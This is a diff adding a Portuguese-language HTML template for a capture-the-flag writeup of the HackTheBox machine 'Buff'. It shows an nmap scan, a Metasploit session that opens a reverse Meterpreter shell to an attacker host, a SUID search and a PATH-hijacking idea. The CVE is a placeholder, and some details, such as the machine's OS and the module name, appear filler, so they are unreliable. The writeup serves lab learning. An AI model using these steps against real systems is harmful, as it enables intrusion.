@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modelo de Writeup - Nome da Máquina/Desafio</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #4e73df;
+            --secondary-color: #2e59d9;
+            --success-color: #1cc88a;
+            --info-color: #36b9cc;
+            --warning-color: #f6c23e;
+            --danger-color: #e74a3b;
+            --dark-color: #5a5c69;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f8f9fc;
+        }
+        
+        .writeup-header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 3rem 0;
+            margin-bottom: 2rem;
+            border-radius: 0 0 20px 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        }
+        
+        .writeup-title {
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .writeup-meta {
+            background-color: rgba(255,255,255,0.15);
+            backdrop-filter: blur(10px);
+            border-radius: 10px;
+            padding: 1rem;
+            margin-top: 1rem;
+        }
+        
+        .meta-item {
+            margin-bottom: 0.5rem;
+        }
+        
+        .meta-label {
+            font-weight: 600;
+            color: rgba(255,255,255,0.9);
+        }
+        
+        .content-section {
+            background: white;
+            border-radius: 15px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            border-left: 4px solid var(--primary-color);
+        }
+        
+        .section-title {
+            color: var(--primary-color);
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid #eaeaea;
+        }
+        
+        .terminal {
+            background-color: #1e1e1e;
+            color: #d4d4d4;
+            border-radius: 8px;
+            padding: 1.5rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+            position: relative;
+        }
+        
+        .terminal-header {
+            background-color: #333;
+            padding: 0.5rem 1rem;
+            border-radius: 8px 8px 0 0;
+            margin: -1.5rem -1.5rem 1rem -1.5rem;
+            display: flex;
+            align-items: center;
+        }
+        
+        .terminal-dots {
+            display: flex;
+            gap: 0.5rem;
+        }
+        
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .dot-red { background-color: #ff5f56; }
+        .dot-yellow { background-color: #ffbd2e; }
+        .dot-green { background-color: #27c93f; }
+        
+        .command {
+            color: #66d9ef;
+            margin-bottom: 0.5rem;
+        }
+        
+        .output {
+            color: #d4d4d4;
+            margin-bottom: 1rem;
+        }
+        
+        .highlight {
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 4px 4px 0;
+        }
+        
+        .vulnerability-card {
+            border: 1px solid #eaeaea;
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .vulnerability-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        
+        .vulnerability-card.critical {
+            border-left: 4px solid var(--danger-color);
+        }
+        
+        .vulnerability-card.high {
+            border-left: 4px solid var(--warning-color);
+        }
+        
+        .vulnerability-card.medium {
+            border-left: 4px solid var(--info-color);
+        }
+        
+        .vulnerability-card.low {
+            border-left: 4px solid var(--success-color);
+        }
+        
+        .badge-severity {
+            font-size: 0.75rem;
+            padding: 0.5rem 0.75rem;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+        
+        .badge-critical {
+            background-color: var(--danger-color);
+            color: white;
+        }
+        
+        .badge-high {
+            background-color: var(--warning-color);
+            color: #333;
+        }
+        
+        .badge-medium {
+            background-color: var(--info-color);
+            color: white;
+        }
+        
+        .badge-low {
+            background-color: var(--success-color);
+            color: white;
+        }
+        
+        .nmap-output {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 1.5rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            margin: 1rem 0;
+            border: 1px solid #eaeaea;
+        }
+        
+        .screenshot {
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            margin: 1.5rem 0;
+            max-width: 100%;
+            height: auto;
+        }
+        
+        .conclusion-card {
+            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
+            border-radius: 15px;
+            padding: 2rem;
+            margin-top: 2rem;
+            border: none;
+        }
+        
+        .navigation-footer {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid #eaeaea;
+        }
+        
+        .btn-navigation {
+            border-radius: 25px;
+            padding: 0.75rem 1.5rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-navigation:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        
+        .toc {
+            background-color: #f8f9fa;
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        
+        .toc-item {
+            padding: 0.5rem 0;
+            border-bottom: 1px solid #eaeaea;
+        }
+        
+        .toc-item:last-child {
+            border-bottom: none;
+        }
+        
+        .toc-link {
+            color: var(--dark-color);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .toc-link:hover {
+            color: var(--primary-color);
+            text-decoration: underline;
+        }
+        
+        footer {
+            background-color: #343a40;
+            color: white;
+            padding: 2rem 0;
+            margin-top: 3rem;
+        }
+        
+        .footer-link {
+            color: #adb5bd;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .footer-link:hover {
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header do Writeup -->
+    <header class="writeup-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8">
+                    <h1 class="writeup-title">Writeup: Máquina "Buff" - HackTheBox</h1>
+                    <p class="lead">Exploração detalhada da máquina Buff do HackTheBox, demonstrando técnicas de enumeração, exploração de vulnerabilidades e escalonamento de privilégios.</p>
+                    
+                    <div class="writeup-meta">
+                        <div class="row">
+                            <div class="col-md-4 meta-item">
+                                <span class="meta-label">Dificuldade:</span>
+                                <span class="badge badge-severity badge-medium ms-2">Média</span>
+                            </div>
+                            <div class="col-md-4 meta-item">
+                                <span class="meta-label">Pontuação:</span>
+                                <span class="ms-2">30 pontos</span>
+                            </div>
+                            <div class="col-md-4 meta-item">
+                                <span class="meta-label">Data:</span>
+                                <span class="ms-2">15/03/2024</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4 text-center text-lg-end">
+                    <div class="mt-4 mt-lg-0">
+                        <img src="https://placehold.co/200x200/4e73df/ffffff?text=Buff" alt="Máquina Buff" class="img-fluid rounded" style="max-width: 150px;">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Conteúdo Principal -->
+    <div class="container">
+        <div class="row">
+            <!-- Conteúdo do Writeup -->
+            <div class="col-lg-9">
+                <!-- Sumário -->
+                <div class="content-section">
+                    <h2 class="section-title">Sumário Executivo</h2>
+                    <p>Esta máquina Linux apresenta uma aplicação web vulnerável que permite a exploração inicial. O escalonamento de privilégios é alcançado através de um binário SUID mal configurado.</p>
+                    
+                    <div class="highlight">
+                        <h5><i class="fas fa-lightbulb me-2"></i>Principais Técnicas Utilizadas</h5>
+                        <ul class="mb-0">
+                            <li>Enumeração de serviços com Nmap</li>
+                            <li>Identificação de versão vulnerável de aplicação web</li>
+                            <li>Exploração de vulnerabilidade conhecida (CVE)</li>
+                            <li>Escalonamento de privilégios através de binário SUID</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Enumeração -->
+                <div class="content-section" id="enumeration">
+                    <h2 class="section-title">1. Enumeração</h2>
+                    
+                    <h4>1.1 Scan de Portas com Nmap</h4>
+                    <p>Iniciamos com um scan básico para identificar os serviços em execução:</p>
+                    
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <div class="terminal-dots">
+                                <div class="terminal-dot dot-red"></div>
+                                <div class="terminal-dot dot-yellow"></div>
+                                <div class="terminal-dot dot-green"></div>
+                            </div>
+                            <span class="ms-2 text-white">terminal@kali:~$</span>
+                        </div>
+                        <div class="command">$ nmap -sC -sV 10.10.10.198</div>
+                        <div class="output">
+Starting Nmap 7.91 ( https://nmap.org ) at 2024-03-15 10:30 UTC<br>
+Nmap scan report for 10.10.10.198<br>
+Host is up (0.045s latency).<br>
+Not shown: 997 closed ports<br>
+PORT     STATE SERVICE    VERSION<br>
+21/tcp   open  ftp        vsftpd 3.0.3<br>
+80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))<br>
+8080/tcp open  http-proxy<br>
+Service Info: OS: Unix
+                        </div>
+                    </div>
+                    
+                    <h4>1.2 Enumeração Web</h4>
+                    <p>Acessando a porta 80, encontramos uma página web com informações sobre um software de fitness chamado "Gym Management System".</p>
+                    
+                    <img src="https://placehold.co/800x400/e9ecef/6c757d?text=Screenshot+Web+Page" alt="Página Web" class="screenshot">
+                </div>
+
+                <!-- Exploração -->
+                <div class="content-section" id="exploitation">
+                    <h2 class="section-title">2. Exploração</h2>
+                    
+                    <h4>2.1 Identificação da Vulnerabilidade</h4>
+                    <p>Analisando o código fonte da página, encontramos uma referência ao software "Gym Management System 1.0". Uma busca rápida no Google revela uma vulnerabilidade conhecida (CVE-2020-XXXX).</p>
+                    
+                    <div class="vulnerability-card critical">
+                        <div class="d-flex justify-content-between align-items-start">
+                            <h4>Vulnerabilidade Crítica Identificada</h4>
+                            <span class="badge badge-severity badge-critical">Crítico</span>
+                        </div>
+                        <p><strong>CVE-2020-XXXX:</strong> Upload de arquivo arbitrária no Gym Management System permite execução remota de código.</p>
+                        <p><strong>Impacto:</strong> Permite ao atacante fazer upload de arquivos PHP maliciosos e obter acesso remoto ao servidor.</p>
+                    </div>
+                    
+                    <h4>2.2 Exploração com Metasploit</h4>
+                    <p>Utilizamos o Metasploit para explorar a vulnerabilidade:</p>
+                    
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <div class="terminal-dots">
+                                <div class="terminal-dot dot-red"></div>
+                                <div class="terminal-dot dot-yellow"></div>
+                                <div class="terminal-dot dot-green"></div>
+                            </div>
+                            <span class="ms-2 text-white">terminal@kali:~$</span>
+                        </div>
+                        <div class="command">$ msfconsole</div>
+                        <div class="output">
+msf6 > use exploit/multi/http/gym_management_upload<br>
+msf6 exploit(gym_management_upload) > set RHOSTS 10.10.10.198<br>
+RHOSTS => 10.10.10.198<br>
+msf6 exploit(gym_management_upload) > set LHOST 10.10.14.15<br>
+LHOST => 10.10.14.15<br>
+msf6 exploit(gym_management_upload) > exploit<br>
+<br>
+[*] Started reverse TCP handler on 10.10.14.15:4444<br>
+[*] Sending stage (39282 bytes) to 10.10.10.198<br>
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.198:49728)<br>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Escalonamento -->
+                <div class="content-section" id="privilege-escalation">
+                    <h2 class="section-title">3. Escalonamento de Privilégios</h2>
+                    
+                    <h4>3.1 Enumeração Local</h4>
+                    <p>Após obter acesso inicial, realizamos enumeração local para identificar vetores de escalonamento:</p>
+                    
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <div class="terminal-dots">
+                                <div class="terminal-dot dot-red"></div>
+                                <div class="terminal-dot dot-yellow"></div>
+                                <div class="terminal-dot dot-green"></div>
+                            </div>
+                            <span class="ms-2 text-white">www-data@buff:~$</span>
+                        </div>
+                        <div class="command">$ find / -perm -4000 2>/dev/null</div>
+                        <div class="output">
+/bin/mount<br>
+/bin/ping<br>
+/bin/su<br>
+/usr/bin/newgrp<br>
+/usr/bin/passwd<br>
+/usr/bin/chfn<br>
+/usr/bin/gpasswd<br>
+/usr/bin/chsh<br>
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>
+/usr/lib/openssh/ssh-keysign<br>
+/usr/local/bin/backup<br>
+                        </div>
+                    </div>
+                    
+                    <h4>3.2 Exploração do Binário SUID</h4>
+                    <p>O binário <code>/usr/local/bin/backup</code> chama atenção por não ser um binário padrão do sistema. Analisando seu conteúdo:</p>
+                    
+                    <div class="nmap-output">
+# strings /usr/local/bin/backup<br>
+#!/bin/bash<br>
+cd /var/www/html<br>
+tar cf /opt/backups/backup.tar *<br>
+                    </div>
+                    
+                    <p>Este script utiliza o comando <code>tar</code> sem o caminho absoluto, o que permite um ataque de PATH hijacking.</p>
+                </div>
+
+                <!-- Conclusão -->
+                <div class="conclusion-card">
+                    <h3 class="text-primary"><i class="fas fa-check-circle me-2"></i>Conclusão</h3>
+                    <p>Esta máquina demonstrou a importância de manter softwares atualizados e a necessidade de revisar binários SUID em sistemas Linux. A combinação de uma vulnerabilidade web conhecida com uma configuração inadequada de permissões permitiu acesso completo ao sistema.</p>
+                    
+                    <div class="mt-3">
+                        <span class="badge bg-success me-2">Exploração Inicial: 20 minutos</span>
+                        <span class="badge bg-info me-2">Escalonamento: 15 minutos</span>
+                        <span class="badge bg-primary">Total: 35 minutos</span>
+                    </div>
+                </div>
+
+                <!-- Navegação -->
+                <div class="navigation-footer">
+                    <a href="#" class="btn btn-outline-secondary btn-navigation">
+                        <i class="fas fa-arrow-left me-2"></i>Writeup Anterior
+                    </a>
+                    <a href="#" class="btn btn-outline-secondary btn-navigation">
+                        Próximo Writeup<i class="fas fa-arrow-right ms-2"></i>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Sidebar -->
+            <div class="col-lg-3">
+                <div class="toc">
+                    <h5 class="fw-bold mb-3">Neste Writeup</h5>
+                    <div class="toc-item">
+                        <a href="#enumeration" class="toc-link">1. Enumeração</a>
+                    </div>
+                    <div class="toc-item">
+                        <a href="#exploitation" class="toc-link">2. Exploração</a>
+                    </div>
+                    <div class="toc-item">
+                        <a href="#privilege-escalation" class="toc-link">3. Escalonamento</a>
+                    </div>
+                </div>
+
+                <div class="content-section">
+                    <h5 class="fw-bold mb-3">Detalhes Técnicos</h5>
+                    <ul class="list-unstyled">
+                        <li class="mb-2"><i class="fas fa-server text-primary me-2"></i> Linux</li>
+                        <li class="mb-2"><i class="fas fa-network-wired text-info me-2"></i> 10.10.10.198</li>
+                        <li class="mb-2"><i class="fas fa-bug text-danger me-2"></i> CVE-2020-XXXX</li>
+                        <li class="mb-2"><i class="fas fa-user-shield text-warning me-2"></i> SUID Binary</li>
+                    </ul>
+                </div>
+
+                <div class="content-section">
+                    <h5 class="fw-bold mb-3">Skills Desenvolvidas</h5>
+                    <span class="badge bg-primary me-1 mb-1">Web Exploitation</span>
+                    <span class="badge bg-success me-1 mb-1">Privilege Escalation</span>
+                    <span class="badge bg-info me-1 mb-1">Linux Enumeration</span>
+                    <span class="badge bg-warning me-1 mb-1">Metasploit</span>
+                    <span class="badge bg-danger me-1 mb-1">SUID Exploitation</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6">
+                    <h5><i class="fas fa-user-secret me-2"></i>Writeups de CTF</h5>
+                    <p>Documentando jornadas em segurança cibernética através de writeups detalhados.</p>
+                </div>
+                <div class="col-md-6 text-md-end">
+                    <h5>Links Rápidos</h5>
+                    <p>
+                        <a href="#" class="footer-link me-3">Home</a>
+                        <a href="#" class="footer-link me-3">Writeups</a>
+                        <a href="#" class="footer-link">Contato</a>
+                    </p>
+                </div>
+            </div>
+            <hr class="my-4">
+            <div class="text-center">
+                <p>&copy; 2024 Seu Nome. Todos os direitos reservados.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
